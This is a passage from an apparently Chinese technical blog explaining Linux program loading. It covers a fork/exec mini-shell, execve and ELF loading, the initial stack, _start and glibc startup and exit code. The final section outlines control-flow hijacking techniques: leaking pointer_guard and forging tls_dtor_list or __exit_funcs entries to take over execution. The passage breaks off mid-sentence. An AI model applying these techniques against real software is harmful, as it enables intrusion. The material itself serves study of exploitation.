删除换行符</span></span><br><span class="line">        command[<span class="built_in">strcspn</span>(command, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否输入了退出命令</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(command) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 子进程执行命令</span></span><br><span class="line">            <span class="keyword">if</span> (execlp(command, command, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;minibash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 父进程等待子进程结束</span></span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// fork失败</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 在进入 <code>execve()</code> 系统调用之后，Linux
内核就开始进行真正的装载工作。在内核中， <code>execve()</code>
系统调用相应的入口是 sys_execve()， 它被定义在
<code>arch\i386\kernel\Process.c</code> 。<code>sys_execve()</code>
进行一些参数的检查复制之后，调用 <code>do_execve()</code>
。<code>do_execve()</code> 会首先查找被执行的文件，如果找到文件，则
<code>do_execve()</code>
读取文件的前128个字节判断文件的格式，每种可执行文件的格式的开头几个字节都是很特殊的，特别是开头4个字节，常常被称做魔数（Magic
Number），通过对魔数的判断可以确定文件的格式和类型。比如 ELF
的可执行文件格式的头 4 个字节为 <code>\x7felf</code> ；而 Java
的可执行文件格式的头4个字节为 <code>cafe</code> ；如果被执行的是 Shell
脚本或 perl 、python 等这种解释型语言的脚本，那么它的第一行往往是
<code>#!/bin/sh</code> 或 <code>#!/usr/bin/perl</code> 或
<code>#!/usr/bin/python</code> ，这时候前两个字节 <code>#</code> 和
<code>!</code>
就构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定具体的解释程序的路径。</p>
<p>当 <code>do_execve()</code> 读取了这 128
个字节的文件头部之后，然后调用 <code>search_binary_handle()</code>
去搜索和匹配合适的可执行文件装载处理过程。Linux中所有被支持的可执行文件格式都有相应的装载处理过程，
<code>search_binary_handle()</code>
会通过判断文件头部的魔数确定文件的格式，并且调用相应的装载处理过程。比如
ELF 可执行文件的装载处理过程叫做 <code>load_elf_binary()</code>； a.out
可执行文件的装载处理过程叫做
<code>load_aout_binary()</code>；而装载可执行脚本程序的处理过程叫做
<code>load_script()</code> 。 这里我们只关心 ELF 可执行文件的装载，
<code>load_elf_binary()</code> 被定义在 <code>fs/Binfmt_elf.c</code>
，这个函数的代码比较长，它的主要步骤是： -
检查ELF可执行文件格式的有效性，比如魔数、程序头表中段（Segment）的数量。
- 寻找动态链接的 <code>.interp</code> 段，设置动态链接器路径。 - 根据
ELF 可执行文件的<strong>程序头表</strong>的描述，对 ELF
文件进行映射，比如代码、数据、只读数据。 - 初始化 ELF
进程环境，比如进程启动时 EDX 寄存器的地址应该是 <code>DT_FINI</code>
的地址（参照动态链接）。 - 将系统调用的返回地址修改成 ELF
可执行文件的入口点，这个入口点取决于程序的链接方式，对于<strong>静态链接</strong>的
ELF 可执行文件，这个程序入口就是 ELF 文件的文件头中
<strong><code>e_entry</code>
所指的地址</strong>；对于<strong>动态链接</strong>的 ELF
可执行文件，程序入口点是<strong>动态链接器</strong>。</p>
<p>当 <code>load_elf_binary()</code> 执行完毕，返回至
<code>do_execve()</code> 再返回至 <code>sys_execve()</code> 时，上面的第
5 步中已经把系统调用的返回地址改成了被装载的 ELF
程序的入口地址了。所以当 <code>sys_execve()</code>
系统调用从内核态返回到用户态时，EIP 寄存器直接跳转到了 ELF
程序的入口地址，于是新的程序开始执行，ELF 可执行文件装载完成。 ##
进程虚拟地址空间
在现代操作系统中，每个进程都有自己的虚拟地址空间，这是一个抽象的地址空间，由连续的虚拟地址组成。每个进程在其虚拟地址空间中运行，不会直接访问物理内存地址。</p>
<p>操作系统将每个进程的虚拟地址空间划分为多个区域，例如代码段、数据段、堆和栈等。每个区域具有特定的用途和权限。
- 代码段：包含可执行程序的机器指令。 -
数据段：包含静态和全局变量的初始值。 - BSS
段：包含需要初始化为零的静态和全局变量。 -
动态链接段：包含动态链接所需的信息。</p>
<p>加载器将这些段从 ELF
文件中复制到相应的虚拟内存地址，并建立虚拟地址与物理内存地址的映射关系。
## execve 系列函数之间的区别 <code>execve</code> 和其他
<code>exec</code> 系列函数（<code>execl</code>, <code>execlp</code>,
<code>execle</code>, <code>execv</code>, <code>execvp</code>,
<code>execvpe</code>）是 UNIX 和 Linux
系统编程中用于执行程序的重要工具。它们都用于在当前进程中加载并执行一个新程序，从而完全替换当前进程的内存空间、数据、堆栈等内容，但进程ID保持不变。这些函数通常用于需要替换当前执行的程序的情况，如
shell 实现中运行外部命令。</p>
<h3 id="基本原理">基本原理</h3>
<p>所有这些函数最终都会调用系统的 <code>execve</code>
系统调用。<code>execve</code> 是实现其他 <code>exec</code>
函数的底层基础。当调用任一 <code>exec</code>
函数时，当前进程的地址空间将被新程序替换，但进程的 PID
保持不变。这意味着新程序将继续使用调用 <code>exec</code> 的进程的
PID，并从 <code>main()</code>
函数开始执行，而原进程的所有代码和数据则被新程序的代码和数据所替换。</p>
<h3 id="函数差异">函数差异</h3>
<ul>
<li><strong>execve</strong>
<ul>
<li><strong>原型</strong>：<code>int execve(const char *pathname, char *const argv[], char *const envp[]);</code></li>
<li><strong>参数</strong>：
<ul>
<li><code>pathname</code>：要执行的程序路径。</li>
<li><code>argv</code>：传递给新程序的参数数组，以 NULL 结尾。</li>
<li><code>envp</code>：传递给新程序的环境变量数组，以 NULL 结尾。</li>
</ul></li>
<li><strong>特点</strong>：是唯一一个直接系统调用的 <code>exec</code>
函数，其他 <code>exec</code> 函数最终都是通过调用 <code>execve</code>
实现的。</li>
</ul></li>
<li><strong>execl, execlp, execle</strong>
<ul>
<li><strong>特点</strong>：这些函数允许直接在函数调用中列出参数，而不是通过数组传递。</li>
<li><code>execl</code> 和 <code>execle</code> 需要提供程序的完整路径，而
<code>execlp</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execle</code> 允许直接指定环境变量。</li>
</ul></li>
<li><strong>execv, execvp, execvpe</strong>
<ul>
<li><strong>特点</strong>：这些函数通过数组传递参数给新程序。</li>
<li><code>execv</code> 需要提供程序的完整路径。</li>
<li><code>execvp</code> 和 <code>execvpe</code> 在 PATH
环境变量中搜索程序名。</li>
<li><code>execvpe</code> 类似于
<code>execvp</code>，但允许指定环境变量。</li>
</ul></li>
</ul>
<h3 id="使用场景">使用场景</h3>
<ul>
<li><strong>execve</strong>：需要精确控制新程序的环境变量时使用。</li>
<li><strong>execl, execlp,
execle</strong>：当参数数量已知且不需要动态构建参数数组时使用。</li>
<li><strong>execv, execvp,
execvpe</strong>：当参数以数组形式提前构建好或在程序中动态生成时使用。 #
运行 ## 进程栈的初始化
我们知道进程刚开始启动的时候，须知道一些进程运行的环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法是操作系统在进程启动前将这些信息提前保存到进程的虚拟空间的栈中。</li>
</ul>
<p>假设我们运行如下命令，即运行 <code>ls</code> 程序，传入的参数为
<code>/home</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br></pre></td></tr></table></figure></div>
<p>在程序初始状态的栈如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004415525.png"
                     
alt="image-20241108004415525" 
                > 栈顶寄存器 rsp
指向的位置是初始化以后堆栈的顶部，最前面的 8
个字节表示<strong>命令行参数的数量</strong>，我们的例子里面是两个，即
<code>/usr/bin/ls</code> 和 <code>/home</code>
，紧接的就是分布指向这两个参数字符串的<strong>指针</strong>；后面跟了一个0；接着是一个以
0 结尾的指向环境变量字符串的指针数组。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0b14b8f7b214bfb36efc1979d4c50b10.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
进程在启动以后，程序的库部分会把堆栈里的初始化信息中的参数信息传递给
<code>main()</code> 函数，也就是我们熟知的 <code>main()</code>
函数的两个 <code>argc</code> 和 <code>argv</code>
两个参数，这两个参数分别对应这里的命令行参数数量和命令行参数字符串指针数组。</p>
<h2 id="main-函数之外的代码">main 函数之外的代码</h2>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004734754.png"
                     
alt="image-20241108004734754" 
                >
<figcaption aria-hidden="true">image-20241108004734754</figcaption>
</figure>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004754680.png"
                     
alt="image-20241108004754680" 
                > 当运行程序时，shell 或 gui 调用
<code>execve()</code> ，它执行 linux 系统调用 <code>execve()</code>
设置一个堆栈，并将 <code>argc</code> 、 <code>argv</code> 和
<code>envp</code> 压入其中。文件描述 0、1 和 2（<code>stdin</code>
、<code>stdout</code> 、<code>stderr</code>)保留为 shell
设置的值，动态链接器完成重定位工作。当一切准备就绪后，通过调用
<code>_start()</code> 将控制权交给程序。</p>
<p>一般情况下 ELF 的入口点为 <code>_start</code>
函数，这个函数的主要作用是设置 <code>___libc_start_main</code>
函数的所需参数。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049080 endbr32</span><br><span class="line">.text:08049084 xor     ebp, ebp                        ; 设置 ebp 为 0 表示最外层栈</span><br><span class="line">.text:08049086 pop     esi                             ; argc</span><br><span class="line">.text:08049087 mov     ecx, esp                        ; argv</span><br><span class="line">.text:08049089 and     esp, 0FFFFFFF0h                 ; 栈对齐</span><br><span class="line">.text:0804908C push    eax                             ; 静态链接程序默认为 0 ，动态链接程序默认为模块对应的 link_map</span><br><span class="line">.text:0804908D push    esp                             ; stack_end</span><br><span class="line">.text:0804908E push    edx                             ; rtld_fini</span><br><span class="line">.text:0804908F call    sub_80490B7</span><br><span class="line">.text:0804908F</span><br><span class="line">.text:08049094 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); ebx = offset _GLOBAL_OFFSET_TABLE_</span><br><span class="line">.text:0804909A lea     eax, (__libc_csu_fini - 804C000h)[ebx] ; (__libc_csu_fini - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A0 push    eax                             ; fini</span><br><span class="line">.text:080490A1 lea     eax, (__libc_csu_init - 804C000h)[ebx] ; (__libc_csu_init - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A7 push    eax                             ; init</span><br><span class="line">.text:080490A8 push    ecx                             ; ubp_av</span><br><span class="line">.text:080490A9 push    esi                             ; argc</span><br><span class="line">.text:080490AA mov     eax, offset main</span><br><span class="line">.text:080490B0 push    eax                             ; main</span><br><span class="line">.text:080490B1 call    ___libc_start_main</span><br><span class="line">.text:080490B1</span><br><span class="line">.text:080490B6 hlt</span><br><span class="line">.text:080490B7 sub_80490B7 proc near                   ; CODE XREF: _start+F↑p</span><br><span class="line">.text:080490B7 mov     ebx, [esp]</span><br><span class="line">.text:080490BA retn</span><br></pre></td></tr></table></figure></div> 之后调用 <code>__libc_start_main</code>
函数，通过调试发现使用 glibc-2.23 的 32 位程序实际调用的是
<code>generic_start_main</code> 函数，该函数位于
<code>csu/libc-start.c</code> 中，定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> LIBC_START_MAIN generic_start_main</span></span><br><span class="line"></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">		 <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">		 __typeof (main) init,</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure></div> 可见和
<code>_start</code> 函数里的调用一致，一共有 7 个参数，其中
<code>main</code> 由第一个参数传入，紧接着是 <code>argc</code> 和
<code>argv</code>（这里称为 <code>ubp_av</code>
，因为其中还包含了环境变量表）。除了 <code>main</code>
的函数指针之外，外部还要传入 3 个函数指针，分别是： -
<code>init</code>：<code>main</code> 调用前的初始化工作，默认是
<code>__libc_csu_init</code> 函数指针。 -
<code>fini</code>：<code>main</code> 结束后的收尾工作，默认是
<code>__libc_csu_fini</code> 函数指针。 -
<code>rtld_fini</code>：和动态加载有关的收尾工作，<code>rtld</code> 是
runtime loader 的缩写。如果是动态链接程序默认是 <code>_dl_fini</code>
函数指针，如果是静态链接程序默认为 NULL 。</p>
<p>最后的 <code>stack_end</code> 标明了栈底的地址，即最高的栈地址。</p>
<p>首先初始化 <code>__libc_multiple_libcs</code> 为 0 之后
<code>generic_start_main</code> 会调用 <code>__cxa_atexit</code> 将
<code>rtld_fini</code> 注册为 <code>main</code> 函数结束后的回调函数。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">  __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
当然如果是静态链接程序还会做一些额外的初始化，在动态链接程序中这些初始化是在动态连接器中完成的。
- 如果是开启 PIE 的静态程序会调用 <code>_dl_relocate_static_pie</code>
函数初始化 <code>link_map</code> 并且进行重定位。 - 初始化
<code>__environ</code> 。 - 初始化 <code>__libc_stack_end</code> 。 -
调用 <code>dl_aux_init</code>
根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作。 -
如果<strong>程序头表</strong>指针 <code>dl_phdr</code>
没有初始化，就通过 ELF 文件头的 <code>e_phoff</code> 初始化
<code>dl_phdr</code>（程序头表地址），通过 <code>e_phnum</code> 初始化
<code>dl_phnum</code>（程序头表中的项数）。不过这个一般在上一步根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作时就已经初始化过了。
- 调用 <code>_libc_init_secure</code> 函数，如果
<code>_libc_enable_secure_decided</code> 不为 0 则初始化
<code>_libc_enable_secure</code> 为
<code>(__geteuid() != __getuid() || __getegid() != __getgid())</code> 。
- <code>__geteuid() != __getuid()</code>：比较有效用户 ID（effective
user ID）和实际用户 ID（real user
ID）。如果它们不相等，表示当前进程以特权用户身份运行（比如以 root
用户权限运行）。 - <code>__getegid() != __getgid()</code>：比较有效组
ID（effective group ID）和实际组 ID（real group
ID）。如果它们不相等，表示当前进程以特权用户组身份运行。 -
这段代码的目的是判断当前进程是否以特权用户或特权用户组身份运行。这在某些情况下可能需要采取不同的安全措施或限制特权操作。
- 调用 <code>__tunables_init</code>
函数从环境变量中提取信息，并用于初始化可调节项列表，以便在程序运行时可以根据这些可调节项来进行相应的配置或调整。
- 使用 <code>ARCH_INIT_CPU_FEATURES</code> 宏初始化 CPU 的相关参数到
<code>cpu_features</code> 类型的结构体 <code>_dl_x86_cpu_features</code>
中。 - 重定位代码中的绝对地址引用 。 - 调用
<code>__libc_setup_tls</code> 函数初始化 tls 。 - 如果
<code>__libc_multiple_libcs</code> 为 0 则调用
<code>DL_SYSDEP_OSCHECK</code> 宏来初始化 <code>dl_osversion</code>
为内核版本号。 - 调用 <code>__pthread_initialize_minimal</code>
函数初始化线程库 。 - 初始化 <code>__stack_chk_guard</code> 。 - 初始化
<code>pointer_chk_guard</code> 。 - 调用 <code>_libc_init_first</code>
函数初始化 <code>_libc_argc</code> ，<code>_libc_argv</code> 和
<code>environ</code> 等。 - 调用 <code>__cxa_atexit</code> 函数将
<code>fini</code> 注册为 <code>main</code> 函数结束后的回调函数 。</p>
<p>之后判断函数指针 <code>init</code>
是否为空，如果不为空则调用该函数指针，也就是
<code>__libc_csu_init</code> 函数。</p>
<p><code>__libc_csu_init</code> 函数定义在 <code>csu/elf-init.c</code>
中，内容如下： -
如果是<strong>静态链接程序</strong>会依次调用函数指针数组
<code>__preinit_array_start</code> 中的所有函数。 - 调用
<code>_init</code> 函数。 - 依次调用函数指针数组
<code>__init_array_start</code>（<code>.init_array</code>）中的所有函数。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_init (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For dynamically linked executables the preinit array is executed by</span></span><br><span class="line"><span class="comment">     the dynamic linker (before initializing any shared object).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _init ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 其中调用的 <code>init</code> 函数如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:0000037C push    ebx                             ; _init</span><br><span class="line">.init:0000037D sub     esp, 8</span><br><span class="line">.init:00000380 call    __x86_get_pc_thunk_bx</span><br><span class="line">.init:00000380</span><br><span class="line">.init:00000385 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.init:0000038B mov     eax, ds:(__gmon_start___ptr - 1FD8h)[ebx]</span><br><span class="line">.init:00000391 test    eax, eax</span><br><span class="line">.init:00000393 jz      short loc_39A</span><br><span class="line">.init:00000393</span><br><span class="line">.init:00000395 call    ___gmon_start__</span><br><span class="line">.init:00000395</span><br><span class="line">.init:0000039A</span><br><span class="line">.init:0000039A loc_39A:                                ; CODE XREF: _init_proc+17↑j</span><br><span class="line">.init:0000039A add     esp, 8</span><br><span class="line">.init:0000039D pop     ebx</span><br><span class="line">.init:0000039E retn</span><br></pre></td></tr></table></figure></div>
在静态链接程序中直接 <code>mov eax, 0; test eax, eax;</code>
，因此这个函数什么也不做。而动态链接程序中由于此时
<code>__gmon_start___@got</code> 为 NULL ，因此同样什么也不做。</p>
<p>从 <code>__libc_csu_init</code> 函数返回后会调用 <code>main</code>
函数和 <code>exit</code> 函数。 ## exit 中的 hook <code>exit</code>
函数定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stdlib/exit.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span> &#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">//首先销毁TLS</span></span><br><span class="line">        __call_tls_dtors ();</span><br><span class="line">    <span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line">    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line">    _exit (status);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    _exit (int status) &#123;</span></span><br><span class="line"><span class="comment">        status &amp;= 0xff;</span></span><br><span class="line"><span class="comment">        abort ();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 首先 <code>__call_tls_dtors</code> 会被
<code>exit</code> 调用。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (tls_dtor_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">        dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">        PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">        func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">        atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 泄露 <code>pointer_guard</code>
后可以劫持 <code>tls_dtor_list</code> ，构造 <code>dtor_list</code>
结构体控制 rdi（<code>obj</code> 域）和 rdx（<code>next</code>
域），进而利用 <code>setcontext</code> 来劫持程序执行流程 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> &#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 泄露 <code>pointer_guard</code> 后（如果该 glibc
版本加密了该函数指针）可以通过劫持 <code>__exit_funcs</code>
数组来获取控制流。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	    <span class="keyword">switch</span> (f-&gt;flavor) &#123;</span><br><span class="line">	        <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	        <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">case</span> ef_free:</span><br><span class="line">	        <span class="keyword">case</span> ef_us:</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_on:</span><br><span class="line">	            onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_at:</span><br><span class="line">	            atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            atfct ();</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	            cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    *listp = cur-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但这种方法只能控制 rsi 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	    &#125; on;</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	        <span class="type">void</span> *dso_handle;</span><br><span class="line">	    &#125; cxa;</span><br><span class="line">    &#125; func;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></p>
<p>如果是<strong>动态链接程序</strong> <code>__run_exit_handlers</code>
函数会调用 <code>_dl_fini</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004857778.png"
                     
alt="image-20241108004857778" 
                > <code>_dl_fini</code>
函数定义如下，该函数的主要作用就是依次调用
<code>link_map-&gt;l_info[DT_FINI_ARRAY]</code>
中描述的函数数组中的函数指针。有一种攻击方法就是通过伪造
